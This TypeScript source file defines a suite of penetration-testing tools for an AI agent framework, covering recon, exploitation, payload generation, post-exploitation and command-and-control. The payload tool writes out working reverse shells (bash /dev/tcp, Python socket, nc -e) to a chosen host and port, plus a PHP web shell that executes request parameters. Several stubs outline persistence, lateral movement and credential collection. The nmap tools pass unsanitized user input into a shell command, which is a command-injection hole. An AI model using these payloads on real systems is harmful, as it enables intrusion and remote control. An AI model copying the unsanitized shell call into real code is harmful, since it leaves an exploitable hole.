import { Type } from "@sinclair/typebox";
import { loadConfig } from "../../config/config.js";
import { optionalStringEnum } from "../schema/typebox.js";
import type { AnyAgentTool } from "./common.js";
import { jsonResult, readStringParam } from "./common.js";
import { exec } from "node:child_process";
import { promisify } from "node:util";
import fs from "node:fs/promises";
import path from "node:path";
import { resolveStateDir } from "../../infra/state-dir.js";

const execAsync = promisify(exec);

// Singleton workspace for pen test data
let pentestWorkspace: string | null = null;

function getPentestWorkspace(): string {
  if (!pentestWorkspace) {
    const config = loadConfig();
    const workspacePath =
      config.security?.pentest?.workspace ?? "~/.openclaw/security/pentest/";
    pentestWorkspace = workspacePath.startsWith("~")
      ? workspacePath.replace("~", resolveStateDir())
      : workspacePath;
    // Ensure directory exists
    fs.mkdir(pentestWorkspace, { recursive: true }).catch(() => {
      // Ignore errors, will be handled on write
    });
  }
  return pentestWorkspace;
}

// Penetration Testing Tool Schemas

const PentestReconSchema = Type.Object({
  target: Type.String(),
  type: optionalStringEnum(["subdomain", "port_scan", "service_detection", "osint"] as const),
  ports: Type.Optional(Type.String()),
  tools: Type.Optional(Type.Array(Type.String())),
  output: Type.Optional(Type.String()),
});

const PentestExploitSchema = Type.Object({
  target: Type.String(),
  vulnerability: Type.Optional(Type.String()),
  action: optionalStringEnum(["analyze", "develop", "test", "execute"] as const),
  language: Type.Optional(Type.String()),
  exploit: Type.Optional(Type.String()),
});

const PentestPayloadSchema = Type.Object({
  type: optionalStringEnum(["reverse_shell", "web_shell", "meterpreter", "custom"] as const),
  platform: Type.Optional(Type.String()),
  architecture: Type.Optional(Type.String()),
  lhost: Type.Optional(Type.String()),
  lport: Type.Optional(Type.Number()),
  format: Type.Optional(Type.String()),
  language: Type.Optional(Type.String()),
  features: Type.Optional(Type.Array(Type.String())),
  template: Type.Optional(Type.String()),
  encoder: Type.Optional(Type.String()),
  iterations: Type.Optional(Type.Number()),
});

const PentestPostExploitSchema = Type.Object({
  session: Type.String(),
  action: optionalStringEnum([
    "enumerate",
    "privilege_escalation",
    "persistence",
    "lateral_movement",
    "data_collection",
  ] as const),
  scope: Type.Optional(Type.Array(Type.String())),
  platform: Type.Optional(Type.String()),
  method: Type.Optional(Type.String()),
});

const PentestReportSchema = Type.Object({
  target: Type.String(),
  scope: Type.Optional(Type.String()),
  findings: Type.Optional(Type.Array(Type.String())),
  format: optionalStringEnum(["markdown", "json", "html", "pdf"] as const),
  output: Type.Optional(Type.String()),
});

const PentestC2Schema = Type.Object({
  action: optionalStringEnum(["setup", "deploy", "list", "remove"] as const),
  type: Type.Optional(Type.String()),
  lhost: Type.Optional(Type.String()),
  lport: Type.Optional(Type.Number()),
  name: Type.Optional(Type.String()),
});

// Integration Tool Schemas

const PentestNmapSchema = Type.Object({
  target: Type.String(),
  ports: Type.Optional(Type.String()),
  scan_type: Type.Optional(Type.String()),
  options: Type.Optional(Type.String()),
  output: Type.Optional(Type.String()),
});

const PentestMetasploitSchema = Type.Object({
  action: optionalStringEnum(["search", "use", "execute", "generate"] as const),
  module: Type.Optional(Type.String()),
  target: Type.Optional(Type.String()),
  payload: Type.Optional(Type.String()),
  options: Type.Optional(Type.Record(Type.String(), Type.String())),
});

const PentestBurpSchema = Type.Object({
  action: optionalStringEnum(["scan", "spider", "repeater", "intruder"] as const),
  target: Type.Optional(Type.String()),
  config: Type.Optional(Type.Record(Type.String(), Type.Unknown())),
});

const PentestShodanSchema = Type.Object({
  query: Type.String(),
  filters: Type.Optional(Type.Record(Type.String(), Type.String())),
  limit: Type.Optional(Type.Number()),
});

const PentestCensysSchema = Type.Object({
  query: Type.String(),
  index: Type.Optional(optionalStringEnum(["ipv4", "websites", "certificates"] as const)),
  limit: Type.Optional(Type.Number()),
});

// Penetration Testing Tools

export function createPentestReconTool(): AnyAgentTool {
  return {
    label: "Penetration Testing",
    name: "pentest_recon",
    description:
      "Perform reconnaissance activities: subdomain enumeration, port scanning, service detection, and OSINT gathering. Supports multiple tools (nmap, amass, subfinder, etc.).",
    parameters: PentestReconSchema,
    execute: async (_toolCallId, args) => {
      const params = args as Record<string, unknown>;
      const workspace = getPentestWorkspace();

      try {
        const target = readStringParam(params, "target", { required: true });
        const type = readStringParam(params, "type") as
          | "subdomain"
          | "port_scan"
          | "service_detection"
          | "osint"
          | undefined;
        const ports = readStringParam(params, "ports");
        const tools = Array.isArray(params.tools)
          ? (params.tools.filter((t) => typeof t === "string") as string[])
          : undefined;
        const output = readStringParam(params, "output");

        let result: Record<string, unknown> = {
          status: "success",
          target,
          type: type ?? "port_scan",
        };

        // Subdomain enumeration
        if (type === "subdomain" || !type) {
          const subdomainTools = tools ?? ["amass", "subfinder"];
          result.subdomains = [];
          result.tools_used = subdomainTools;

          // Stub: In real implementation, would execute tools
          result.message = `Subdomain enumeration planned for ${target} using ${subdomainTools.join(", ")}. Tool execution requires proper installation and configuration.`;
        }

        // Port scanning
        if (type === "port_scan" || !type) {
          const portRange = ports ?? "1-1000";
          result.ports = portRange;
          result.scan_type = "tcp_syn";

          // Try to use nmap if available
          try {
            const { stdout } = await execAsync(`nmap -p ${portRange} ${target}`, {
              timeout: 30000,
            });
            result.nmap_output = stdout;
            result.status = "success";
          } catch (error) {
            result.message = `Port scan planned for ${target}:${portRange}. Nmap not available or scan failed. Install nmap for automated scanning.`;
            result.error = error instanceof Error ? error.message : String(error);
          }
        }

        // Service detection
        if (type === "service_detection") {
          const portList = ports ?? "80,443,8080";
          result.ports = portList;
          result.message = `Service detection planned for ${target}:${portList}. Requires nmap with service detection enabled.`;
        }

        // OSINT gathering
        if (type === "osint") {
          result.message = `OSINT gathering planned for ${target}. Consider using Shodan, Censys, or other OSINT tools.`;
        }

        // Save output if requested
        if (output) {
          const outputPath = path.join(workspace, output);
          await fs.writeFile(outputPath, JSON.stringify(result, null, 2));
          result.output_file = outputPath;
        }

        return jsonResult(result);
      } catch (error) {
        return jsonResult({
          status: "error",
          error: error instanceof Error ? error.message : String(error),
        });
      }
    },
  };
}

export function createPentestExploitTool(): AnyAgentTool {
  return {
    label: "Penetration Testing",
    name: "pentest_exploit",
    description:
      "Analyze vulnerabilities, develop exploits, test exploits, and execute exploits. Supports multiple languages and exploit frameworks.",
    parameters: PentestExploitSchema,
    execute: async (_toolCallId, args) => {
      const params = args as Record<string, unknown>;
      const workspace = getPentestWorkspace();

      try {
        const target = readStringParam(params, "target", { required: true });
        const vulnerability = readStringParam(params, "vulnerability");
        const action = readStringParam(params, "action") as
          | "analyze"
          | "develop"
          | "test"
          | "execute"
          | undefined;
        const language = readStringParam(params, "language");
        const exploit = readStringParam(params, "exploit");

        let result: Record<string, unknown> = {
          status: "success",
          target,
          action: action ?? "analyze",
        };

        if (vulnerability) {
          result.vulnerability = vulnerability;
        }

        // Analyze vulnerability
        if (action === "analyze" || !action) {
          result.message = `Vulnerability analysis planned for ${target}${vulnerability ? ` (${vulnerability})` : ""}. Review CVE details, affected versions, and potential exploit paths.`;
        }

        // Develop exploit
        if (action === "develop") {
          const lang = language ?? "python";
          const exploitFile = exploit ?? `exploit_${Date.now()}.${lang === "python" ? "py" : lang === "bash" ? "sh" : "txt"}`;
          const exploitPath = path.join(workspace, exploitFile);

          result.exploit_file = exploitPath;
          result.language = lang;
          result.message = `Exploit development planned. Template will be created at ${exploitPath}. Customize based on vulnerability details.`;

          // Create basic exploit template
          const template = `#!/usr/bin/env ${lang}
# Exploit for ${target}${vulnerability ? ` - ${vulnerability}` : ""}
# Generated by OpenClaw

# TODO: Implement exploit logic
# Target: ${target}
${vulnerability ? `# Vulnerability: ${vulnerability}` : ""}

def main():
    # Exploit implementation
    pass

if __name__ == "__main__":
    main()
`;

          await fs.writeFile(exploitPath, template);
          result.exploit_created = true;
        }

        // Test exploit
        if (action === "test") {
          if (!exploit) {
            return jsonResult({
              status: "error",
              error: "Exploit file path required for testing",
            });
          }
          result.message = `Exploit testing planned for ${exploit} against ${target}. Execute in isolated environment.`;
        }

        // Execute exploit
        if (action === "execute") {
          if (!exploit) {
            return jsonResult({
              status: "error",
              error: "Exploit file path required for execution",
            });
          }
          result.message = `Exploit execution planned for ${exploit} against ${target}. WARNING: Only execute on systems you own or have explicit permission to test.`;
          result.warning = "Ensure proper authorization before executing exploits";
        }

        return jsonResult(result);
      } catch (error) {
        return jsonResult({
          status: "error",
          error: error instanceof Error ? error.message : String(error),
        });
      }
    },
  };
}

export function createPentestPayloadTool(): AnyAgentTool {
  return {
    label: "Penetration Testing",
    name: "pentest_payload",
    description:
      "Generate payloads: reverse shells, web shells, meterpreter payloads, and custom payloads. Supports multiple platforms, architectures, and formats.",
    parameters: PentestPayloadSchema,
    execute: async (_toolCallId, args) => {
      const params = args as Record<string, unknown>;
      const workspace = getPentestWorkspace();

      try {
        const type = readStringParam(params, "type") as
          | "reverse_shell"
          | "web_shell"
          | "meterpreter"
          | "custom"
          | undefined;
        const platform = readStringParam(params, "platform");
        const architecture = readStringParam(params, "architecture");
        const lhost = readStringParam(params, "lhost");
        const lport = readStringParam(params, "lport");
        const format = readStringParam(params, "format");
        const language = readStringParam(params, "language");

        let result: Record<string, unknown> = {
          status: "success",
          type: type ?? "reverse_shell",
        };

        // Reverse shell
        if (type === "reverse_shell" || !type) {
          const plat = platform ?? "linux";
          const arch = architecture ?? "x64";
          const host = lhost ?? "127.0.0.1";
          const port = params.lport ? Number(params.lport) : 4444;
          const fmt = format ?? "bash";

          result.platform = plat;
          result.architecture = arch;
          result.lhost = host;
          result.lport = port;
          result.format = fmt;

          // Generate basic reverse shell payload
          let payload = "";
          if (fmt === "bash" && plat === "linux") {
            payload = `bash -i >& /dev/tcp/${host}/${port} 0>&1`;
          } else if (fmt === "python") {
            payload = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
          } else if (fmt === "nc" && plat === "linux") {
            payload = `nc -e /bin/sh ${host} ${port}`;
          } else {
            payload = `# Reverse shell payload for ${plat}/${arch}\n# LHOST: ${host}\n# LPORT: ${port}\n# Format: ${fmt}\n# TODO: Generate platform-specific payload`;
          }

          const payloadFile = `payload_reverse_${plat}_${arch}_${Date.now()}.txt`;
          const payloadPath = path.join(workspace, payloadFile);
          await fs.writeFile(payloadPath, payload);

          result.payload = payload;
          result.payload_file = payloadPath;
          result.message = `Reverse shell payload generated for ${plat}/${arch}`;
        }

        // Web shell
        if (type === "web_shell") {
          const lang = language ?? "php";
          const features = Array.isArray(params.features)
            ? (params.features.filter((f) => typeof f === "string") as string[])
            : ["command_execution"];

          let shell = "";
          if (lang === "php") {
            shell = `<?php\nif(isset($_REQUEST['cmd'])){\n    echo "<pre>";\n    $cmd = ($_REQUEST['cmd']);\n    system($cmd);\n    echo "</pre>";\n    die;\n}\n?>`;
          } else {
            shell = `# Web shell for ${lang}\n# Features: ${features.join(", ")}\n# TODO: Implement ${lang} web shell`;
          }

          const shellFile = `webshell_${lang}_${Date.now()}.${lang}`;
          const shellPath = path.join(workspace, shellFile);
          await fs.writeFile(shellPath, shell);

          result.language = lang;
          result.features = features;
          result.shell_file = shellPath;
          result.message = `Web shell generated for ${lang}`;
        }

        // Meterpreter payload
        if (type === "meterpreter") {
          const plat = platform ?? "linux";
          const arch = architecture ?? "x64";
          const host = lhost ?? "127.0.0.1";
          const port = params.lport ? Number(params.lport) : 4444;

          result.message = `Meterpreter payload planned for ${plat}/${arch}. Use Metasploit msfvenom: msfvenom -p ${plat}/${arch}/meterpreter/reverse_tcp LHOST=${host} LPORT=${port} -f exe -o payload.exe`;
          result.metasploit_command = `msfvenom -p ${plat}/${arch}/meterpreter/reverse_tcp LHOST=${host} LPORT=${port} -f exe`;
        }

        return jsonResult(result);
      } catch (error) {
        return jsonResult({
          status: "error",
          error: error instanceof Error ? error.message : String(error),
        });
      }
    },
  };
}

export function createPentestPostExploitTool(): AnyAgentTool {
  return {
    label: "Penetration Testing",
    name: "pentest_post_exploit",
    description:
      "Post-exploitation activities: system enumeration, privilege escalation, persistence, lateral movement, and data collection.",
    parameters: PentestPostExploitSchema,
    execute: async (_toolCallId, args) => {
      const params = args as Record<string, unknown>;

      try {
        const session = readStringParam(params, "session", { required: true });
        const action = readStringParam(params, "action", { required: true }) as
          | "enumerate"
          | "privilege_escalation"
          | "persistence"
          | "lateral_movement"
          | "data_collection";
        const scope = Array.isArray(params.scope)
          ? (params.scope.filter((s) => typeof s === "string") as string[])
          : undefined;
        const platform = readStringParam(params, "platform");
        const method = readStringParam(params, "method");

        let result: Record<string, unknown> = {
          status: "success",
          session,
          action,
        };

        // System enumeration
        if (action === "enumerate") {
          const enumScope = scope ?? ["system", "network", "users"];
          result.scope = enumScope;
          result.message = `System enumeration planned for session ${session}. Scope: ${enumScope.join(", ")}. Commands: uname -a, ifconfig, whoami, etc.`;
        }

        // Privilege escalation
        if (action === "privilege_escalation") {
          const plat = platform ?? "linux";
          const escMethod = method ?? "exploit";
          result.platform = plat;
          result.method = escMethod;
          result.message = `Privilege escalation planned for ${plat} using ${escMethod}. Check for sudo misconfigurations, SUID binaries, kernel exploits.`;
        }

        // Persistence
        if (action === "persistence") {
          const persistMethod = method ?? "cron";
          result.method = persistMethod;
          result.message = `Persistence mechanism planned: ${persistMethod}. Options: cron, systemd, registry, startup scripts.`;
        }

        // Lateral movement
        if (action === "lateral_movement") {
          result.message = `Lateral movement planned from session ${session}. Check for SSH keys, credentials, network shares.`;
        }

        // Data collection
        if (action === "data_collection") {
          const collectScope = scope ?? ["documents", "credentials", "configs"];
          result.scope = collectScope;
          result.message = `Data collection planned. Scope: ${collectScope.join(", ")}. Search for sensitive files and credentials.`;
        }

        return jsonResult(result);
      } catch (error) {
        return jsonResult({
          status: "error",
          error: error instanceof Error ? error.message : String(error),
        });
      }
    },
  };
}

export function createPentestReportTool(): AnyAgentTool {
  return {
    label: "Penetration Testing",
    name: "pentest_report",
    description:
      "Generate comprehensive penetration test reports in multiple formats (markdown, JSON, HTML, PDF). Includes executive summary, methodology, findings, and recommendations.",
    parameters: PentestReportSchema,
    execute: async (_toolCallId, args) => {
      const params = args as Record<string, unknown>;
      const workspace = getPentestWorkspace();

      try {
        const target = readStringParam(params, "target", { required: true });
        const scope = readStringParam(params, "scope");
        const findings = Array.isArray(params.findings)
          ? (params.findings.filter((f) => typeof f === "string") as string[])
          : undefined;
        const format = readStringParam(params, "format") as
          | "markdown"
          | "json"
          | "html"
          | "pdf"
          | undefined;
        const output = readStringParam(params, "output");

        const reportFormat = format ?? "markdown";
        const reportFile =
          output ?? `pentest_report_${target.replace(/[^a-zA-Z0-9]/g, "_")}_${Date.now()}.${reportFormat === "markdown" ? "md" : reportFormat === "json" ? "json" : reportFormat === "html" ? "html" : "txt"}`;
        const reportPath = path.join(workspace, reportFile);

        let report: string;

        if (reportFormat === "markdown") {
          report = `# Penetration Test Report

## Executive Summary

**Target**: ${target}
${scope ? `**Scope**: ${scope}` : ""}
**Date**: ${new Date().toISOString()}

## Methodology

1. Reconnaissance
2. Vulnerability Assessment
3. Exploitation
4. Post-Exploitation
5. Reporting

## Findings

${findings && findings.length > 0 ? findings.map((f) => `- ${f}`).join("\n") : "No findings specified"}

## Risk Assessment

[Risk ratings and CVSS scores]

## Recommendations

[Remediation recommendations]

## Appendices

[Logs, screenshots, proof-of-concepts]
`;
        } else if (reportFormat === "json") {
          report = JSON.stringify(
            {
              target,
              scope,
              date: new Date().toISOString(),
              findings: findings ?? [],
              methodology: [
                "Reconnaissance",
                "Vulnerability Assessment",
                "Exploitation",
                "Post-Exploitation",
                "Reporting",
              ],
            },
            null,
            2,
          );
        } else {
          report = `Penetration Test Report\nTarget: ${target}\nDate: ${new Date().toISOString()}\n\nFindings:\n${findings ? findings.join("\n") : "No findings specified"}`;
        }

        await fs.writeFile(reportPath, report);

        return jsonResult({
          status: "success",
          message: `Penetration test report generated`,
          target,
          format: reportFormat,
          report_file: reportPath,
        });
      } catch (error) {
        return jsonResult({
          status: "error",
          error: error instanceof Error ? error.message : String(error),
        });
      }
    },
  };
}

export function createPentestC2Tool(): AnyAgentTool {
  return {
    label: "Penetration Testing",
    name: "pentest_c2",
    description:
      "Command and control (C2) infrastructure management: setup C2 servers, deploy agents, list active sessions, and remove C2 infrastructure.",
    parameters: PentestC2Schema,
    execute: async (_toolCallId, args) => {
      const params = args as Record<string, unknown>;

      try {
        const action = readStringParam(params, "action") as
          | "setup"
          | "deploy"
          | "list"
          | "remove"
          | undefined;
        const type = readStringParam(params, "type");
        const lhost = readStringParam(params, "lhost");
        const lport = params.lport ? Number(params.lport) : undefined;
        const name = readStringParam(params, "name");

        let result: Record<string, unknown> = {
          status: "success",
          action: action ?? "setup",
        };

        // Setup C2
        if (action === "setup" || !action) {
          const c2Type = type ?? "http";
          const host = lhost ?? "127.0.0.1";
          const port = lport ?? 8080;
          result.type = c2Type;
          result.lhost = host;
          result.lport = port;
          result.message = `C2 infrastructure setup planned: ${c2Type} server on ${host}:${port}. Use frameworks like Cobalt Strike, Empire, or custom C2.`;
        }

        // Deploy agent
        if (action === "deploy") {
          if (!name) {
            return jsonResult({
              status: "error",
              error: "Agent name required for deployment",
            });
          }
          result.agent_name = name;
          result.message = `Agent deployment planned: ${name}. Generate payload and deploy to target systems.`;
        }

        // List sessions
        if (action === "list") {
          result.sessions = [];
          result.message = "C2 session listing. Query active sessions from C2 framework.";
        }

        // Remove C2
        if (action === "remove") {
          result.message = "C2 infrastructure removal planned. Clean up servers and agents.";
        }

        return jsonResult(result);
      } catch (error) {
        return jsonResult({
          status: "error",
          error: error instanceof Error ? error.message : String(error),
        });
      }
    },
  };
}

// Integration Tools

export function createPentestNmapTool(): AnyAgentTool {
  return {
    label: "Penetration Testing",
    name: "pentest_nmap",
    description:
      "Nmap integration for network scanning: port scanning, service detection, OS detection, and vulnerability scanning.",
    parameters: PentestNmapSchema,
    execute: async (_toolCallId, args) => {
      const params = args as Record<string, unknown>;
      const workspace = getPentestWorkspace();

      try {
        const target = readStringParam(params, "target", { required: true });
        const ports = readStringParam(params, "ports");
        const scanType = readStringParam(params, "scan_type");
        const options = readStringParam(params, "options");
        const output = readStringParam(params, "output");

        // Build nmap command
        let command = "nmap";
        if (ports) {
          command += ` -p ${ports}`;
        }
        if (scanType === "udp") {
          command += " -sU";
        } else if (scanType === "syn") {
          command += " -sS";
        } else {
          command += " -sV"; // Service detection by default
        }
        if (options) {
          command += ` ${options}`;
        }
        command += ` ${target}`;

        let result: Record<string, unknown> = {
          status: "success",
          target,
          command,
        };

        try {
          const { stdout, stderr } = await execAsync(command, {
            timeout: 300000, // 5 minutes
          });
          result.nmap_output = stdout;
          if (stderr) {
            result.nmap_stderr = stderr;
          }

          // Save output if requested
          if (output) {
            const outputPath = path.join(workspace, output);
            await fs.writeFile(outputPath, stdout);
            result.output_file = outputPath;
          }
        } catch (error) {
          result.status = "error";
          result.error = error instanceof Error ? error.message : String(error);
          result.message = "Nmap execution failed. Ensure nmap is installed and target is reachable.";
        }

        return jsonResult(result);
      } catch (error) {
        return jsonResult({
          status: "error",
          error: error instanceof Error ? error.message : String(error),
        });
      }
    },
  };
}

export function createPentestMetasploitTool(): AnyAgentTool {
  return {
    label: "Penetration Testing",
    name: "pentest_metasploit",
    description:
      "Metasploit Framework integration: search modules, use exploits, execute exploits, and generate payloads.",
    parameters: PentestMetasploitSchema,
    execute: async (_toolCallId, args) => {
      const params = args as Record<string, unknown>;

      try {
        const action = readStringParam(params, "action", { required: true }) as
          | "search"
          | "use"
          | "execute"
          | "generate";
        const module = readStringParam(params, "module");
        const target = readStringParam(params, "target");
        const payload = readStringParam(params, "payload");
        const options = params.options as Record<string, string> | undefined;

        let result: Record<string, unknown> = {
          status: "success",
          action,
        };

        // Search modules
        if (action === "search") {
          if (!module) {
            return jsonResult({
              status: "error",
              error: "Module search term required",
            });
          }
          result.search_term = module;
          result.message = `Metasploit module search planned: ${module}. Use 'msfconsole -x \"search ${module}\"' or msfconsole search command.`;
        }

        // Use module
        if (action === "use") {
          if (!module) {
            return jsonResult({
              status: "error",
              error: "Module name required",
            });
          }
          result.module = module;
          result.message = `Metasploit module usage planned: ${module}. Use 'msfconsole -x \"use ${module}\"' or interactively in msfconsole.`;
        }

        // Execute exploit
        if (action === "execute") {
          if (!module || !target) {
            return jsonResult({
              status: "error",
              error: "Module and target required for execution",
            });
          }
          result.module = module;
          result.target = target;
          result.options = options;
          result.message = `Metasploit exploit execution planned: ${module} against ${target}. Configure options and execute in msfconsole.`;
        }

        // Generate payload
        if (action === "generate") {
          if (!payload) {
            return jsonResult({
              status: "error",
              error: "Payload type required for generation",
            });
          }
          result.payload = payload;
          result.message = `Metasploit payload generation planned: ${payload}. Use msfvenom to generate payloads.`;
        }

        return jsonResult(result);
      } catch (error) {
        return jsonResult({
          status: "error",
          error: error instanceof Error ? error.message : String(error),
        });
      }
    },
  };
}

export function createPentestBurpTool(): AnyAgentTool {
  return {
    label: "Penetration Testing",
    name: "pentest_burp",
    description:
      "Burp Suite integration for web application security testing: scanning, spidering, repeater, and intruder attacks.",
    parameters: PentestBurpSchema,
    execute: async (_toolCallId, args) => {
      const params = args as Record<string, unknown>;

      try {
        const action = readStringParam(params, "action", { required: true }) as
          | "scan"
          | "spider"
          | "repeater"
          | "intruder";
        const target = readStringParam(params, "target");
        const config = params.config as Record<string, unknown> | undefined;

        let result: Record<string, unknown> = {
          status: "success",
          action,
        };

        if (target) {
          result.target = target;
        }

        // Scan
        if (action === "scan") {
          result.message = `Burp Suite scan planned for ${target ?? "target"}. Use Burp Scanner or Burp Suite API for automated scanning.`;
        }

        // Spider
        if (action === "spider") {
          result.message = `Burp Suite spider planned for ${target ?? "target"}. Use Burp Spider or Burp Suite API to crawl web application.`;
        }

        // Repeater
        if (action === "repeater") {
          result.message = `Burp Suite repeater planned. Use Burp Repeater or Burp Suite API to manually test requests.`;
        }

        // Intruder
        if (action === "intruder") {
          result.message = `Burp Suite intruder planned. Use Burp Intruder or Burp Suite API for automated attacks.`;
        }

        if (config) {
          result.config = config;
        }

        return jsonResult(result);
      } catch (error) {
        return jsonResult({
          status: "error",
          error: error instanceof Error ? error.message : String(error),
        });
      }
    },
  };
}

export function createPentestShodanTool(): AnyAgentTool {
  return {
    label: "Penetration Testing",
    name: "pentest_shodan",
    description:
      "Shodan integration for internet-wide scanning and OSINT: search for devices, services, and vulnerabilities.",
    parameters: PentestShodanSchema,
    execute: async (_toolCallId, args) => {
      const params = args as Record<string, unknown>;

      try {
        const query = readStringParam(params, "query", { required: true });
        const filters = params.filters as Record<string, string> | undefined;
        const limit = params.limit ? Number(params.limit) : 10;

        let result: Record<string, unknown> = {
          status: "success",
          query,
          limit,
        };

        // Build Shodan query
        let shodanQuery = query;
        if (filters) {
          const filterStr = Object.entries(filters)
            .map(([k, v]) => `${k}:${v}`)
            .join(" ");
          shodanQuery = `${query} ${filterStr}`;
        }

        result.shodan_query = shodanQuery;
        result.message = `Shodan search planned: ${shodanQuery}. Requires Shodan API key. Use Shodan CLI or API: shodan search "${shodanQuery}" --limit ${limit}`;

        return jsonResult(result);
      } catch (error) {
        return jsonResult({
          status: "error",
          error: error instanceof Error ? error.message : String(error),
        });
      }
    },
  };
}

export function createPentestCensysTool(): AnyAgentTool {
  return {
    label: "Penetration Testing",
    name: "pentest_censys",
    description:
      "Censys integration for internet-wide scanning and OSINT: search IPv4 addresses, websites, and certificates.",
    parameters: PentestCensysSchema,
    execute: async (_toolCallId, args) => {
      const params = args as Record<string, unknown>;

      try {
        const query = readStringParam(params, "query", { required: true });
        const index = readStringParam(params, "index") as
          | "ipv4"
          | "websites"
          | "certificates"
          | undefined;
        const limit = params.limit ? Number(params.limit) : 10;

        let result: Record<string, unknown> = {
          status: "success",
          query,
          index: index ?? "ipv4",
          limit,
        };

        result.message = `Censys search planned: ${query} in ${index ?? "ipv4"} index. Requires Censys API credentials. Use Censys CLI or API.`;

        return jsonResult(result);
      } catch (error) {
        return jsonResult({
          status: "error",
          error: error instanceof Error ? error.message : String(error),
        });
      }
    },
  };
}
